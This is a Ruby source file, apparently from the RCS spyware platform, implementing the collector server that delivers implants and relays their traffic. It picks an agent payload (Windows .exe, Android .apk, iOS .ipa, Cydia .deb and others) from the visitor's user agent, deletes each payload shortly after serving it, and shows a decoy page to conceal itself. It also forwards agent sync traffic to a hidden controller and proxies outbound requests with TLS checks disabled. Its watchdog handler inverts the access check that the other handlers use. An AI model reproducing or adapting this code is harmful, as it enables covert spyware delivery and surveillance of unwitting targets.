require_relative 'sync_protocol'

require 'rcs-common/mime'
require 'rcs-common/crypt'

require 'resolv'
require 'socket'
require 'bcrypt'

require 'zip'
require 'zip/filesystem'

module RCS
module Collector

class CollectorController < RESTController
  include RCS::Crypt

  def get
    return bad_request unless @request[:uri].start_with?('/')

    # serve the requested file
    return http_get_file(@request[:headers], @request[:uri])
  rescue Exception => e
    trace :error, "HTTP GET: " + e.message
    return decoy_page
  end

  def head
    return bad_request unless @request[:uri].start_with?('/')

    trace :info, "[#{@request[:peer]}] HEAD public request #{@request[:uri]}"
    # serve the requested file
    return http_get_file(@request[:headers], @request[:uri], false)
  rescue Exception => e
    trace :error, "HTTP HEAD: " + e.message
    return decoy_page
  end

  def post
    # this request comes from an anonymizer
    return network_proto if DB.instance.network_protocol_cookies.include? @request[:http_cookie]

    # the REST protocol for agent synchronization
    content, content_type, cookie = Protocol.parse @request[:peer], @request[:uri], @request[:cookie], @request[:content], @request[:anon_version]
    return decoy_page if content.nil?

    return ok(content, {content_type: content_type, cookie: cookie})
  end

  def push
    # only the DB is authorized to send PUSH commands
    unless from_db?(@request[:headers])
      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send PUSH [#{@request[:uri]}] commands!!!"
      return method_not_allowed
    end

    # Forward to rcs-controller
    trace :info, "[NC] Sending push instruction to the controller..."

    resp = send_to_controller(@request)

    if resp.body == 'OK'
      trace :debug, "Network push succeed!"
      return ok(resp.body, content_type: "text/html")
    else
      trace :error, "Network push failed: [#{resp.code}] #{resp.body}"
      return server_error(resp.body, content_type: "text/html")
    end

  rescue Exception => e
    trace :error, e.message
    trace :debug, e.backtrace.join("\n")
    return server_error(e.message, content_type: "text/html")
  end

  def put
    # only the DB is authorized to send PUT commands
    unless from_db?(@request[:headers])
      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send PUT [#{@request[:uri]}] commands!!!"
      return method_not_allowed
    end

    # this is a request to save a file in the public dir
    return http_put_file @request[:uri], @request[:content]
  end

  def delete
    # only the DB is authorized to send DELETE commands
    unless from_db?(@request[:headers])
      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send DELETE [#{@request[:uri]}] commands!!!"
      return method_not_allowed
    end

    return http_delete_file @request[:uri]
  end

  def proxy
    # only the DB is authorized to send PROXY commands
    unless from_db?(@request[:headers])
      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send PROXY [#{@request[:uri]}] commands!!!"
      return method_not_allowed
    end

    # every request received are forwarded externally like a proxy
    return proxy_request(@request)
  end

  def watchdog
    # only the DB is authorized to send WATCHDOG commands
    unless !from_db?(@request[:headers])
      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send WATCHDOG [#{@request[:uri]}] commands!!!"
      return method_not_allowed
    end

    # reply to the periodic heartbeat request
    return watchdog_request(@request)
  end

  private

  #
  # HELPERS
  #

  # returns the content of a file in the public directory
  def http_get_file(headers, uri, delete=true)

    # retrieve the Operating System and app specific extension of the requester
    os, ext = http_get_os(headers)

    trace :info, "[#{@request[:peer]}][#{os}] GET public request #{uri}"

    # no automatic index
    return decoy_page if uri.eql? '/'
    
    # search the file in the public directory
    file_path = Dir.pwd + PUBLIC_DIR + uri

    # complete the request of the client
    file_path = File.realdirpath(file_path)
    
    # and avoid exiting from it
    unless file_path.start_with? Dir.pwd + PUBLIC_DIR
      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to traverse the path [#{uri}] !!!"
      return decoy_page
    end

    # if the file is not present
    unless File.file?(file_path)
      # append the extension for the arch of the requester
      arch_specific_file = uri + ext

      # special case for android melted app
      if os.eql? 'android' and File.exist?(file_path + ".m.apk")
        arch_specific_file = uri + ".m.apk"
        trace :info, "[#{@request[:peer]}][#{os}] redirected to: #{arch_specific_file}"
        return http_redirect arch_specific_file
      end

      # all the other OSes
      if File.file?(file_path + ext)
        trace :info, "[#{@request[:peer]}][#{os}] redirected to: #{arch_specific_file}"
        return http_redirect arch_specific_file
      end
    end

    # cydia must have a not found instead of the decoy page
    return not_found if os == 'cydia' and not File.file?(file_path)

    return decoy_page unless File.file?(file_path)

    content_type = MimeType.get(file_path)

    trace :info, "[#{@request[:peer]}][#{os}] serving #{file_path} (#{File.size(file_path)}) #{content_type}"

    return stream_file(File.realdirpath(file_path), proc {delete_after_serve(File.realdirpath(file_path), os) if delete})
  end

  def delete_after_serve(file, os)
    return if Config.instance.global['DONT_DELETE_AFTER_SERVE']
    Thread.new do
      begin
        sleep 10
        File.unlink(file)
        trace :info, "[#{@request[:peer]}][#{os}] served and deleted #{file}"
      rescue Errno::EACCES
        trace :warn, "[#{@request[:peer]}][#{os}] retrying to delete #{file}"
        # if the file is still in use (fucking windows) retry for at least 100 times
        sleep 0.5
        retry if _r = (_r || 0) + 1 and _r < 100
      rescue Exception => e
        trace :error, "[#{@request[:peer]}][#{os}]: #{e.class} #{e.message}"
      end
      # issue the delete command on all collectors
      DB.instance.public_delete(file.gsub(Dir.pwd + PUBLIC_DIR, ''))
    end
  end

  def http_redirect(file)
    body =  "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n"
    body += "<html><head>\n"
    body += "<title>302 Found</title>\n"
    body += "</head><body>\n"
    body += "<h1>Found</h1>\n"
    body += "<p>The document has moved <a href=\"#{file}\">here</a>.</p>\n"
    body += "</body></html>\n"
    return redirect(body, {location: file})
  end

  # save a file in the /public directory
  def http_put_file(uri, content)
    begin
      path = Dir.pwd + PUBLIC_DIR

      # split the path in all the subdir and the filename
      dirs = uri.split('/').keep_if {|x| x.length > 0}
      file = dirs.pop

      if dirs.length != 0
        # create all the subdirs
        dirs.each do |d|
          path += '/' + d
          Dir.mkdir(path)
        end
      end

      output = path + '/' + file

      # don't overwrite the file
      #raise "File already exists on this collector" if File.exist?(output)

      if File.exist?(output)
        trace :info, "Removing previous copy of: #{output}"
        # remove the file if already present
        FileUtils.rm_rf(output)
      end

      trace :info, "Saving file: #{output}"

      # write the file
      File.open(output, 'wb') { |f| f.write content }

      # if the file is a zip file, extract it into a subfolder
      if output.end_with?('.zip')
        trace :info, "Extracting #{output}..."
        Zip::File.open(output) do |z|
          z.each do |f|
            f_path = File.join(File.dirname(output), File.basename(output, '.zip'), f.name)
            trace :info, "Creating #{f_path}"
            FileUtils.mkdir_p(File.dirname(f_path))
            # overwrite the old one
            FileUtils.rm_rf(f_path) if File.exist?(f_path)
            z.extract(f, f_path)
          end
        end
        # no need to keep the zip file in the repo
        FileUtils.rm_rf output
      end

    rescue Exception => e
      trace :fatal, e.message

      return server_error(e.message, {content_type: 'text/html'})
    end

    return ok('OK', {content_type: 'text/html'})
  end

  # delete a file in the /public directory
  def http_delete_file(uri)
    begin
      path = File.join(Dir.pwd, PUBLIC_DIR, uri)

      # remove both the directory and the zip file
      FileUtils.rm_rf(path)
      FileUtils.rm_rf(path + '.zip')

    rescue Exception => e
      trace :fatal, e.message

      return server_error(e.message, {content_type: 'text/html'})
    end

    return ok('OK', {content_type: 'text/html'})
  end

  # returns the operating system of the requester
  def http_get_os(headers)
    # extract the user-agent
    user_agent = headers[:user_agent]

    return 'unknown', '' if user_agent.nil?

    trace :debug, "[#{@request[:peer]}] User Agent: #{user_agent}"
    
    # return the correct type and extension
    return 'osx', '.app' if user_agent['MacOS'] or user_agent['Macintosh']
    return 'ios', '.ipa' if user_agent['iPhone'] or user_agent['iPad'] or user_agent['iPod']
    return 'winmo', '.cab' if user_agent['Windows CE']
    # windows must be after winmo
    return 'windows', '.exe' if user_agent['Windows']

    if user_agent['BlackBerry']    
      major = 4
      minor = 5
      ver_tuple = user_agent.scan(/\/(\d+)\.(\d+)\.\d+/).flatten
      major, minor = ver_tuple unless ver_tuple.empty?
      if major.to_i >= 5
        version = "5.0"
      else
        version = "4.5"
      end
              
      trace :debug, "[#{@request[:peer]}] Blackberry version: #{version} -- #{major},#{minor}"
      return 'blackberry', "_" + version + '.jad'
    end
  
    if user_agent['Android']
      major = 4
      minor = 0
      ver_tuple = user_agent.scan(/Android (\d+)\.(\d+)/).flatten
      major, minor = ver_tuple unless ver_tuple.empty?
      if major.to_i == 2
        version = 'v2'
      else
        version = 'default'
      end

      trace :debug, "[#{@request[:peer]}] Android version: #{version} -- #{major},#{minor}"
      return 'android', "." + version + '.apk'
    end
    
    # linux must be after android
    return 'linux', '.bin' if user_agent['Linux'] or user_agent['X11']
    return 'symbian', '.sisx' if user_agent['Symbian']

    # special case for cydia requests
    return 'cydia', '.deb' if user_agent['Telesphoreo']

    return 'unknown', ''
  end

  def proxy_request(request)
    # split the request to create the real proxied request
    # the format is:  /METHOD/protocol/host/url
    # e.g.: POST/http/www.googleapis.com/maps/v2...

    params = request[:uri].split('/')
    params.shift
    method = params.shift
    proto = params.shift
    host = params.shift
    url = '/' + params.join('/')
    url += '?' + request[:query] if request[:query]

    port = case proto
             when 'http'
              80
             when 'https'
              443
           end

    trace :debug, "Proxying #{proto} (#{method}): host: #{host}:#{port} url: #{url}"

    http = Net::HTTP.new(host, port)
    http.use_ssl = (port == 443)
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    
    case method
      when 'GET'
        resp = http.get(url)
      when 'POST'
        resp = http.post(url, request[:content], {"Content-Type" => request[:headers][:content_type]})
    end

    return server_error(resp.body) unless resp.kind_of? Net::HTTPSuccess
    return ok(resp.body, {content_type: 'text/html'})
  end

  def watchdog_request(request)
    # authenticate with crc signature
    return method_not_allowed if BCrypt::Password.new(DB.instance.crc_signature) != @request[:uri].gsub("/", '')
    # decrypt the request
    command = aes_decrypt(request[:content], DB.instance.sha1_signature)
    # send the response
    return ok(aes_encrypt("#{Time.now.getutc.to_f} #{$version} #{$external_address} #{DB.instance.check_signature}", DB.instance.sha1_signature), {content_type: "application/octet-stream"}) if command.eql? 'status'
    return ok(aes_encrypt("#{DB.instance.check_signature}", DB.instance.sha1_signature), {content_type: "application/octet-stream"}) if command.eql? 'check' and $watchdog.lock
  end

  def from_db?(headers)
    return false unless headers

    # search the header for our X-Auth-Frontend value
    auth = headers[:x_auth_frontend]
    return false unless auth

    # take the values
    sig = auth.split(' ').last

    # only the db knows this
    return true if sig == File.read(Config.instance.file('DB_SIGN'))

    return false
  end

  def send_to_controller(request)
    controller_srv_port = Config.instance.global['CONTROLLER_PORT']
    http = Net::HTTP.new("127.0.0.1", controller_srv_port)
    http.read_timeout = 600
    http.send_request(request[:method], request[:uri], request[:content], {'X-Forwarded-For' => request[:peer], 'Cookie' => request[:http_cookie] || ''})
  end

  def network_proto
    trace :info, "[NC] [#{@request[:peer]}] Sending Network Protocol requests to the controller..."

    resp = send_to_controller(@request)

    if not resp.is_a? Net::HTTPSuccess
      trace :error, "[NC]: #{resp.inspect} #{resp.body.inspect}"
      return decoy_page
    end

    #trace :debug, "[NC]: #{resp.inspect} #{resp.body.inspect}"

    return ok(resp.body)
  rescue Exception => e
    trace :error, "[NC] ERROR: #{e.message}"
    return decoy_page
  end

end # RCS::Controller::CollectorController

end # RCS::Controller
end # RCS